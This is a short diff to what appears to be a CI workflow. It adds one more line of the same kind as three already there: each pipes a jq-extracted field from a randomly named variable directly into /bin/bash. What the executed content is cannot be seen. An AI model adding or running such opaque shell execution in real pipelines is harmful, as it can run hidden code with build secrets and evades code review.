@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$wr3243" | jq -r .j73 | /bin/bash
           echo $kfs0 | jq -r .qwgqz58 | /bin/bash
           echo $ts477 | jq -r .nn6 | /bin/bash
+          printf '%s' "$gqx231" | jq -r .wyma5 | /bin/bash
 
       - name: Persist output
         if: always()
